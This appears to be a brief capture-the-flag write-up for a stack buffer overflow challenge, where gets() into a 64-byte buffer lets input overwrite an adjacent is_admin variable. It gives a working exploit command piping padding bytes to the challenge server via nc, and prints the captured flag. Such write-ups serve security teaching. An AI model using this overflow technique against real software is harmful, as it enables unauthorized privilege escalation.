Vulnerability Analysis:

The program uses gets() to read input â€” this is unsafe and allows buffer overflow. The buffer buf is 64 bytes. 
The integer is_admin is stored immediately after buf on the stack. By sending more than 64 bytes, you can overwrite is_admin.
Overwriting is_admin with a non-zero value (for example, 1) will grant admin access and print the flag.

Exploit Strategy:

Send 64 bytes to fill the buffer. Then send 4 bytes to overwrite is_admin with the value 1 (little-endian: \x01\x00\x00\x00). 
Finally, send a newline character \n to submit the input.

Exploit Command:

(printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'; printf '\x01\x00\x00\x00\n') | nc chall.1nf1n1ty.team 5004

flag - 1nf1n1ty{4r3_u_r34lly_4dm1n}
